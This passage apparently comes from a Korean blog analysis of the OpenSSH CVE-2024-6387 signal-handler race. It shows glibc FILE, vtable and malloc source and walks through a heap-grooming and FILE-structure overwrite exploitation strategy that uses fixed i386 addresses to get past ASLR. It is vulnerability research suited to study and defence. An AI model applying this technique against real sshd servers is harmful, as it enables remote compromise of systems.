
  <span class="k">switch</span> <span class="p">(</span><span class="n">status</span><span class="p">)</span>
    <span class="p">{</span>
    <span class="k">case</span> <span class="n">__GCONV_OK</span><span class="p">:</span>
    <span class="k">case</span> <span class="n">__GCONV_EMPTY_INPUT</span><span class="p">:</span>
      <span class="n">result</span> <span class="o">=</span> <span class="n">__codecvt_ok</span><span class="p">;</span>
      <span class="k">break</span><span class="p">;</span>

    <span class="k">case</span> <span class="n">__GCONV_FULL_OUTPUT</span><span class="p">:</span>
    <span class="k">case</span> <span class="n">__GCONV_INCOMPLETE_INPUT</span><span class="p">:</span>
      <span class="n">result</span> <span class="o">=</span> <span class="n">__codecvt_partial</span><span class="p">;</span>
      <span class="k">break</span><span class="p">;</span>

    <span class="nl">default:</span>
      <span class="n">result</span> <span class="o">=</span> <span class="n">__codecvt_error</span><span class="p">;</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>

  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div> </div> </div> </details> <p>여기에서 함수 포인터로 참조되는 멤버의 구조는 다음과 같이 구성되게됩니다.</p> <p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/structure_graph.png" /></p> <details> <summary>libio/libioP.h</summary> <div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_jump_t</span>
<span class="p">{</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy2</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_finish_t</span><span class="p">,</span> <span class="n">__finish</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_overflow_t</span><span class="p">,</span> <span class="n">__overflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__underflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__uflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_pbackfail_t</span><span class="p">,</span> <span class="n">__pbackfail</span><span class="p">);</span>
    <span class="cm">/* showmany */</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsputn_t</span><span class="p">,</span> <span class="n">__xsputn</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsgetn_t</span><span class="p">,</span> <span class="n">__xsgetn</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekoff_t</span><span class="p">,</span> <span class="n">__seekoff</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekpos_t</span><span class="p">,</span> <span class="n">__seekpos</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_setbuf_t</span><span class="p">,</span> <span class="n">__setbuf</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_sync_t</span><span class="p">,</span> <span class="n">__sync</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_doallocate_t</span><span class="p">,</span> <span class="n">__doallocate</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_read_t</span><span class="p">,</span> <span class="n">__read</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_write_t</span><span class="p">,</span> <span class="n">__write</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seek_t</span><span class="p">,</span> <span class="n">__seek</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_close_t</span><span class="p">,</span> <span class="n">__close</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_stat_t</span><span class="p">,</span> <span class="n">__stat</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_showmanyc_t</span><span class="p">,</span> <span class="n">__showmanyc</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_imbue_t</span><span class="p">,</span> <span class="n">__imbue</span><span class="p">);</span>
<span class="p">};</span>

<span class="cm">/* We always allocate an extra word following an _IO_FILE.
   This contains a pointer to the function jump table used.
   This is for compatibility with C++ streambuf; the word can
   be used to smash to a pointer to a virtual function table. */</span>

<span class="k">struct</span> <span class="n">_IO_FILE_plus</span>
<span class="p">{</span>
  <span class="kt">FILE</span> <span class="n">file</span><span class="p">;</span>
  <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span><span class="n">vtable</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div> </div> </div> </details> <details> <summary>libio/bits/types/struct_FILE.h:struct _IO_FILE</summary> <div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* The tag name of this struct is _IO_FILE to preserve historic
   C++ mangled names for functions taking FILE* arguments.
   That name should not be used in new code.  */</span>
<span class="k">struct</span> <span class="n">_IO_FILE</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">_flags</span><span class="p">;</span>		<span class="cm">/* High-order word is _IO_MAGIC; rest is flags. */</span>

  <span class="cm">/* The following pointers correspond to the C++ streambuf protocol. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_ptr</span><span class="p">;</span>	<span class="cm">/* Current read pointer */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_end</span><span class="p">;</span>	<span class="cm">/* End of get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_base</span><span class="p">;</span>	<span class="cm">/* Start of putback+get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_base</span><span class="p">;</span>	<span class="cm">/* Start of put area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_ptr</span><span class="p">;</span>	<span class="cm">/* Current put pointer. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_end</span><span class="p">;</span>	<span class="cm">/* End of put area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_buf_base</span><span class="p">;</span>	<span class="cm">/* Start of reserve area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_buf_end</span><span class="p">;</span>	<span class="cm">/* End of reserve area. */</span>

  <span class="cm">/* The following fields are used to support backing up and undo. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span> <span class="cm">/* Pointer to start of non-current get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>  <span class="cm">/* Pointer to first valid character of backup area */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span> <span class="cm">/* Pointer to end of non-current get area. */</span>

  <span class="k">struct</span> <span class="n">_IO_marker</span> <span class="o">*</span><span class="n">_markers</span><span class="p">;</span>

  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_chain</span><span class="p">;</span>

  <span class="kt">int</span> <span class="n">_fileno</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">_flags2</span><span class="p">;</span>
  <span class="n">__off_t</span> <span class="n">_old_offset</span><span class="p">;</span> <span class="cm">/* This used to be _offset but it's too small.  */</span>

  <span class="cm">/* 1+column number of pbase(); 0 is unknown. */</span>
  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">_cur_column</span><span class="p">;</span>
  <span class="kt">signed</span> <span class="kt">char</span> <span class="n">_vtable_offset</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

  <span class="n">_IO_lock_t</span> <span class="o">*</span><span class="n">_lock</span><span class="p">;</span>
<span class="cp">#ifdef _IO_USE_OLD_IO_FILE
</span><span class="p">};</span>

<span class="k">struct</span> <span class="n">_IO_FILE_complete</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="n">_file</span><span class="p">;</span>
<span class="cp">#endif
</span>  <span class="n">__off64_t</span> <span class="n">_offset</span><span class="p">;</span>
  <span class="cm">/* Wide character stream stuff.  */</span>
  <span class="k">struct</span> <span class="n">_IO_codecvt</span> <span class="o">*</span><span class="n">_codecvt</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_IO_wide_data</span> <span class="o">*</span><span class="n">_wide_data</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_freeres_list</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">_freeres_buf</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">__pad5</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">_mode</span><span class="p">;</span>
  <span class="cm">/* Make sure we don't get into trouble again.  */</span>
  <span class="kt">char</span> <span class="n">_unused2</span><span class="p">[</span><span class="mi">15</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="o">-</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)];</span>
<span class="p">};</span>
</code></pre></div> </div> </div> </details> <details> <summary>libio.h:_IO_codecvt</summary> <div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_codecvt</span>
<span class="p">{</span>
  <span class="n">_IO_iconv_t</span> <span class="n">__cd_in</span><span class="p">;</span>
  <span class="n">_IO_iconv_t</span> <span class="n">__cd_out</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div> </div> </div> </details> <details> <summary>libio.h:_IO_iconv_t</summary> <div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">__gconv_step</span> <span class="o">*</span><span class="n">step</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">__gconv_step_data</span> <span class="n">step_data</span><span class="p">;</span>
<span class="p">}</span> <span class="n">_IO_iconv_t</span><span class="p">;</span>
</code></pre></div> </div> </div> </details> <details> <summary>gconv.h:__gconv_step</summary> <div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Description of a conversion step.  */</span>
<span class="k">struct</span> <span class="n">__gconv_step</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">__gconv_loaded_object</span> <span class="o">*</span><span class="n">__shlib_handle</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">__modname</span><span class="p">;</span>

  <span class="cm">/* For internal use by glibc.  (Accesses to this member must occur
     when the internal __gconv_lock mutex is acquired).  */</span>
  <span class="kt">int</span> <span class="n">__counter</span><span class="p">;</span>

  <span class="kt">char</span> <span class="o">*</span><span class="n">__from_name</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">__to_name</span><span class="p">;</span>

  <span class="n">__gconv_fct</span> <span class="n">__fct</span><span class="p">;</span>
  <span class="n">__gconv_btowc_fct</span> <span class="n">__btowc_fct</span><span class="p">;</span>
  <span class="n">__gconv_init_fct</span> <span class="n">__init_fct</span><span class="p">;</span>
  <span class="n">__gconv_end_fct</span> <span class="n">__end_fct</span><span class="p">;</span>

  <span class="cm">/* Information about the number of bytes needed or produced in this
     step.  This helps optimizing the buffer sizes.  */</span>
  <span class="kt">int</span> <span class="n">__min_needed_from</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">__max_needed_from</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">__min_needed_to</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">__max_needed_to</span><span class="p">;</span>

  <span class="cm">/* Flag whether this is a stateful encoding or not.  */</span>
  <span class="kt">int</span> <span class="n">__stateful</span><span class="p">;</span>

  <span class="kt">void</span> <span class="o">*</span><span class="n">__data</span><span class="p">;</span>		<span class="cm">/* Pointer to step-local data.  */</span>
<span class="p">};</span>
</code></pre></div> </div> </div> </details> <details> <summary>iconv/gconv.h:__gconv_fct</summary> <div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Type of a conversion function.  */</span>
<span class="k">typedef</span> <span class="nf">int</span> <span class="p">(</span><span class="o">*</span><span class="n">__gconv_fct</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="n">__gconv_step</span> <span class="o">*</span><span class="p">,</span> <span class="k">struct</span> <span class="n">__gconv_step_data</span> <span class="o">*</span><span class="p">,</span>
			    <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">**</span><span class="p">,</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">,</span>
			    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">**</span><span class="p">,</span> <span class="kt">size_t</span> <span class="o">*</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">);</span>
</code></pre></div> </div> </div> </details> <h4 id="exploit-strategy"> <a href="#exploit-strategy" class="anchor-head"></a> Exploit strategy </h4> <p><code class="language-plaintext highlighter-rouge">SIGALRM</code>에 의해서 어떻게 <code class="language-plaintext highlighter-rouge">Exploit</code>을 달성하는지 알아봅시다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1449</span> <span class="err">#</span><span class="n">define</span> <span class="nf">set_head</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>       <span class="p">((</span><span class="n">p</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">mchunk_size</span> <span class="o">=</span> <span class="p">(</span><span class="n">s</span><span class="p">))</span>
<span class="o">------------------------------------------------------------------------</span>
<span class="mi">3765</span> <span class="n">_int_malloc</span> <span class="p">(</span><span class="n">mstate</span> <span class="n">av</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">bytes</span><span class="p">)</span>
<span class="mi">3766</span> <span class="p">{</span>
<span class="p">....</span>
<span class="mi">3798</span>   <span class="n">nb</span> <span class="o">=</span> <span class="n">checked_request2size</span> <span class="p">(</span><span class="n">bytes</span><span class="p">);</span>
<span class="p">....</span>
<span class="mi">4295</span>               <span class="n">size</span> <span class="o">=</span> <span class="n">chunksize</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
<span class="p">....</span>
<span class="mi">4300</span>               <span class="n">remainder_size</span> <span class="o">=</span> <span class="n">size</span> <span class="o">-</span> <span class="n">nb</span><span class="p">;</span>
<span class="p">....</span>
<span class="mi">4316</span>                   <span class="n">remainder</span> <span class="o">=</span> <span class="n">chunk_at_offset</span> <span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
<span class="p">....</span>
<span class="mi">4320</span>                   <span class="n">bck</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">);</span>
<span class="mi">4321</span>                   <span class="n">fwd</span> <span class="o">=</span> <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
<span class="p">....</span>
<span class="mi">4324</span>                   <span class="n">remainder</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
<span class="mi">4325</span>                   <span class="n">remainder</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">fwd</span><span class="p">;</span>
<span class="mi">4326</span>                   <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">remainder</span><span class="p">;</span>
<span class="mi">4327</span>                   <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">remainder</span><span class="p">;</span>
<span class="p">....</span>
<span class="mi">4337</span>                   <span class="nf">set_head</span> <span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span> <span class="o">|</span> <span class="n">PREV_INUSE</span> <span class="o">|</span>
<span class="mi">4338</span>                             <span class="p">(</span><span class="n">av</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">main_arena</span> <span class="o">?</span> <span class="n">NON_MAIN_ARENA</span> <span class="o">:</span> <span class="mi">0</span><span class="p">));</span>
<span class="mi">4339</span>                   <span class="nf">set_head</span> <span class="p">(</span><span class="n">remainder</span><span class="p">,</span> <span class="n">remainder_size</span> <span class="o">|</span> <span class="n">PREV_INUSE</span><span class="p">);</span>
<span class="p">....</span>
<span class="mi">4343</span>               <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
<span class="p">....</span>
<span class="mi">4345</span>               <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">malloc</code>에서 <code class="language-plaintext highlighter-rouge">4327</code>행이 실행된 이후에 <code class="language-plaintext highlighter-rouge">4339</code>행 이전이 실행되기전 <code class="language-plaintext highlighter-rouge">SIGALRM</code>에 의해 <code class="language-plaintext highlighter-rouge">malloc</code>이 중단되는 경우를 이용합니다.</p> <p>그렇게되면 <code class="language-plaintext highlighter-rouge">remainder</code>가 쪼개졌지만 크기는 갱신되지 않은 상태로 <code class="language-plaintext highlighter-rouge">unsorted</code> 리스트에 연결되게 됩니다. 이때의 크기 필드값은 갱신되지 않았기 때문에 이전에 이 청크를 할당받은 데이터가 그대로 남아있어 해당 값이 크기 데이터로 사용되게 됩니다. 이렇게하여 커진 <code class="language-plaintext highlighter-rouge">remainder chunk</code>의 크기는 뒷쪽을 덮어쓸 수 있을만큼 커질 수 있습니다.</p> <p>이를 악용하는 흐름은 다음과 같습니다.</p> <p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/exploit_process.png" /></p> <ul> <li><code class="language-plaintext highlighter-rouge">Large hole</code>(8KB 크기의 free된 청크)와 <code class="language-plaintext highlighter-rouge">small hole</code>(<code class="language-plaintext highlighter-rouge">320B</code> 크기의 <code class="language-plaintext highlighter-rouge">free</code>된 청크)가 존재합니다.</li> <li><code class="language-plaintext highlighter-rouge">4KB</code> 크기의 청크를 요청하여 <code class="language-plaintext highlighter-rouge">Large hole</code>을 두 개의 청크로 나누도록 유도합니다. <ul> <li>이때 해당 작업에 의해 <code class="language-plaintext highlighter-rouge">Large hole</code>이 두 개의 청크로 나뉘어진 뒤 위의 <code class="language-plaintext highlighter-rouge">4339</code>행이 실행되기전에 <code class="language-plaintext highlighter-rouge">SIGALRM</code>에 의해서 <code class="language-plaintext highlighter-rouge">malloc</code>의 처리가 중단됩니다.</li> <li>이렇게 처리가 중단된 <code class="language-plaintext highlighter-rouge">free remainder</code> 청크의 크기는 이전 값에 의해서 결정됩니다.</li> <li><code class="language-plaintext highlighter-rouge">remainder</code>의 크기가 갱신되지 않고 이전 값(찌거기 값)에 의해서 크기가 증가했기 때문에 청크는 뒤의 <code class="language-plaintext highlighter-rouge">small hole</code>까지 겹치게됩니다.</li> </ul> </li> <li><code class="language-plaintext highlighter-rouge">SIGARLM</code>의 <code class="language-plaintext highlighter-rouge">syslog</code>에서 앞서 알아본 흐름에 의해 <code class="language-plaintext highlighter-rouge">fopen</code>을 호출해 <code class="language-plaintext highlighter-rouge">FILE</code> 구조체가 <code class="language-plaintext highlighter-rouge">small hole</code>에 할당됩니다. <ul> <li>이는 앞선 처리에 의해 <code class="language-plaintext highlighter-rouge">remainder</code> 청크와 겹치는 영역이 됩니다.</li> </ul> </li> <li>인위적으로 증가한 <code class="language-plaintext highlighter-rouge">remainder</code> 청크는 <code class="language-plaintext highlighter-rouge">fopen</code> 이후의 <code class="language-plaintext highlighter-rouge">__fread_unlocked</code>에서 <code class="language-plaintext highlighter-rouge">4KB read buffer</code>를 할당받는 과정에서 한번 더 쪼개지게됩니다.</li> <li>remainder 청크가 기록되고 FILE의 <code class="language-plaintext highlighter-rouge">_vtable_offset</code> 멤버가 remainder 청크의 bk 필드의 3번째 바이트로 덮어씌워지게됩니다.(0x61) <ul> <li>이때 <code class="language-plaintext highlighter-rouge">FILE</code> 구조체의 <code class="language-plaintext highlighter-rouge">_codevt</code> 멤버는 <code class="language-plaintext highlighter-rouge">glibc</code>의 <code class="language-plaintext highlighter-rouge">malloc</code> 빈 중 하나를 가리키게 덮어씌워집니다.</li> <li>이때의 가정은 해당 주소를 모두 공격자가 안다고 가정합니다.</li> </ul> </li> </ul> <p>위의 설명만 봐도 엄청나게 까다로운 조건이 있다는 것을 알 수 있습니다. 이런 까다로운 조건들을 다시 정리해보면 다음과 같습니다.</p> <ul> <li>공격을 성공시키기 위해선 <code class="language-plaintext highlighter-rouge">glibc</code> <code class="language-plaintext highlighter-rouge">FILE</code> 구조체의 <code class="language-plaintext highlighter-rouge">_vtable_offset</code>이 활성화 되어있어야 하기 때문에 현재 정리된 글에선 i386 glibc만 가능합니다.</li> <li>또한 i386 sshd의 메모리가 <code class="language-plaintext highlighter-rouge">0xb7200000</code> 또는 <code class="language-plaintext highlighter-rouge">0xb7400000</code>에만 매핑된다는 점을 악용합니다. <ul> <li>이를 이용해 <code class="language-plaintext highlighter-rouge">ASLR</code>을 최대한 우회하고 이미 알고 있는 주소를 활용합니다.</li> </ul> </li> <li>앞선 언급과 같이 이미 주소값들을 알고 있다는 가정으로 시작을 하기 때문에 <code class="language-plaintext highlighter-rouge">_vtable_offset</code>을 덮어쓸 때 쓰는 <code class="language-plaintext highlighter-rouge">bk</code>값 역시 <code class="language-plaintext highlighter-rouge">0xb761d7f8</code>로 고정입니다. <ul> <li>해당 값의 3번째 바이트 값이 <code class="language-plaintext highlighter-rouge">0x61</code>이므로 <code class="language-plaintext highlighter-rouge">_vtable_offset</code>이 <code class="language-plaintext highlighter-rouge">0x61</code>로 오염된다고 가정할 수 있습니다.</li> </ul> </li> <li><code class="language-plaintext highlighter-rouge">FILE</code>을 덮어쓰기 위해 정확한 타이밍에 위 레이아웃을 달성한 상태로 <code class="language-plaintext highlighter-rouge">malloc</code>의 수행 중에 <code class="language-plaintext highlighter-rouge">SIGALRM</code>이 발생해야합니다.</li> </ul> <p>위와 같은 시나리오를 성공적으로 달성하기 위해 실험에서는 다음과 같은 레이아웃을 구상하여 레이스 컨디션에서 목적을 달성하려합니다.</p> <p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/heap_layout.png" /></p> <p>힙 레이아웃을 어떻게 이렇게 만들까요? 다음 함수들을 이용합니다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1754</span> <span class="nf">cert_parse</span><span class="p">(</span><span class="k">struct</span> <span class="n">sshbuf</span> <span class="o">*</span><span class="n">b</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sshkey</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sshbuf</span> <span class="o">*</span><span class="n">certbuf</span><span class="p">)</span>
<span class="mi">1755</span> <span class="p">{</span>
<span class="p">....</span>
<span class="mi">1797</span>         <span class="k">while</span> <span class="p">(</span><span class="n">sshbuf_len</span><span class="p">(</span><span class="n">principals</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
<span class="p">....</span>
<span class="mi">1805</span>                 <span class="k">if</span> <span class="p">((</span><span class="n">ret</span> <span class="o">=</span> <span class="n">sshbuf_get_cstring</span><span class="p">(</span><span class="n">principals</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">principal</span><span class="p">,</span>
<span class="p">....</span>
<span class="mi">1820</span>                 <span class="n">key</span><span class="o">-&gt;</span><span class="n">cert</span><span class="o">-&gt;</span><span class="n">principals</span><span class="p">[</span><span class="n">key</span><span class="o">-&gt;</span><span class="n">cert</span><span class="o">-&gt;</span><span class="n">nprincipals</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">principal</span><span class="p">;</span>
<span class="mi">1821</span>         <span class="p">}</span>
<span class="o">------------------------------------------------------------------------</span>
 <span class="mi">562</span> <span class="n">cert_free</span><span class="p">(</span><span class="k">struct</span> <span class="n">sshkey_cert</span> <span class="o">*</span><span class="n">cert</span><span class="p">)</span>
 <span class="mi">563</span> <span class="p">{</span>
 <span class="p">...</span>
 <span class="mi">572</span>         <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">cert</span><span class="o">-&gt;</span><span class="n">nprincipals</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
 <span class="mi">573</span>                 <span class="n">free</span><span class="p">(</span><span class="n">cert</span><span class="o">-&gt;</span><span class="n">principals</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</code></pre></div></div> <p>함수 명에서도 볼 수 있듯 공개 키 파싱 코드를 악용해서 위의 힙 레이아웃을 만들게됩니다. 이때 <code class="language-plaintext highlighter-rouge">cert_parse</code>의 <code class="language-plaintext highlighter-rouge">1805</code>행에 위치한 <a href="https://github.com/openssh/openssh-portable/blob/V_9_2/sshkey.c#L1805"><code class="language-plaintext highlighter-rouge">sshbuf_get_cstring</code></a>과 <code class="language-plaintext highlighter-rouge">cert_free</code>의 <code class="language-plaintext highlighter-rouge">573</code>행에 위치한 <a href="https://github.com/openssh/openssh-portable/blob/V_9_2/sshkey.c#L573C3-L573C7"><code class="language-plaintext highlighter-rouge">free</code></a>를 이용합니다.</p> <p><code class="language-plaintext highlighter-rouge">sshbuf_get_cstring</code>은 다음과 같이 <code class="language-plaintext highlighter-rouge">malloc</code>을 사용합니다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span>
<span class="nf">sshbuf_get_cstring</span><span class="p">(</span><span class="k">struct</span> <span class="n">sshbuf</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">valp</span><span class="p">,</span> <span class="kt">size_t</span> <span class="o">*</span><span class="n">lenp</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">size_t</span> <span class="n">len</span><span class="p">;</span>
	<span class="k">const</span> <span class="n">u_char</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="o">*</span><span class="n">z</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">r</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">valp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
		<span class="o">*</span><span class="n">valp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">lenp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
		<span class="o">*</span><span class="n">lenp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">((</span><span class="n">r</span> <span class="o">=</span> <span class="n">sshbuf_peek_string_direct</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">p</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="k">return</span> <span class="n">r</span><span class="p">;</span>
	<span class="cm">/* Allow a \0 only at the end of the string */</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span>
	    <span class="p">(</span><span class="n">z</span> <span class="o">=</span> <span class="n">memchr</span><span class="p">(</span><span class="n">p</span> <span class="p">,</span> <span class="sc">'\0'</span><span class="p">,</span> <span class="n">len</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">z</span> <span class="o">&lt;</span> <span class="n">p</span> <span class="o">+</span> <span class="n">len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">SSHBUF_DBG</span><span class="p">((</span><span class="s">"SSH_ERR_INVALID_FORMAT"</span><span class="p">));</span>
		<span class="k">return</span> <span class="n">SSH_ERR_INVALID_FORMAT</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">((</span><span class="n">r</span> <span class="o">=</span> <span class="n">sshbuf_skip_string</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">valp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
